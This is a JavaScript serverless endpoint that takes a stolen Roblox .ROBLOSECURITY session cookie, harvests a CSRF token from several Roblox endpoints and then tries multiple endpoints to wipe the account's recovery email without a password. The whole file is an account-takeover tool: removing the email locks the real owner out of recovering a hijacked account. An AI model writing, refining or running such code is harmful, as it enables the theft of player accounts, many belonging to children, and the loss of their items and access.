export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    const headers = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    };

    // 1. CSRF LOOP (Friend's method)
    const csrfEndpoints = [
        { url: 'https://auth.roblox.com/v2/logout', method: 'POST' },
        { url: 'https://accountsettings.roblox.com/v1/email', method: 'POST' },
        { url: 'https://auth.roblox.com/v1/account/pin', method: 'GET' },
        { url: 'https://users.roblox.com/v1/users/authenticated', method: 'GET' }
    ];

    let csrfToken = '';
    for (const ep of csrfEndpoints) {
        try {
            const r = await fetch(ep.url, { method: ep.method, headers, body: ep.method === 'POST' ? JSON.stringify({}) : null });
            const token = r.headers.get('x-csrf-token');
            if (token) { csrfToken = token; break; }
        } catch (e) { continue; }
    }

    if (!csrfToken) {
        return res.status(401).json({ success: false, message: 'Cookie is dead. Could not fetch CSRF.' });
    }
    headers['X-CSRF-TOKEN'] = csrfToken;

    // 2. WIPE EMAIL (Brute-forcing multiple endpoints for all ages)
    const wipeEndpoints = [
        'https://accountsettings.roblox.com/v1/email',
        'https://accountinformation.roblox.com/v1/email',
        'https://auth.roblox.com/v1/email'
    ];

    let success = false;
    let messages = [];

    for (const url of wipeEndpoints) {
        try {
            // Try without password
            const wipeRes = await fetch(url, {
                method: 'POST',
                headers,
                body: JSON.stringify({ emailAddress: "" })
            });

            if (wipeRes.status === 200) {
                success = true;
                messages.push(`Email wiped successfully on ${url}.`);
                break; // Stop looping if it worked
            } else if (wipeRes.status === 403) {
                messages.push(`Blocked on ${url}: Password required.`);
            } else {
                messages.push(`Failed on ${url}: Status ${wipeRes.status}`);
            }
        } catch (error) {
            messages.push(`Error on ${url}`);
        }
    }

    if (success) {
        return res.status(200).json({ success: true, data: { messages } });
    } else {
        return res.status(403).json({ success: false, message: messages.join(" | ") });
    }
}
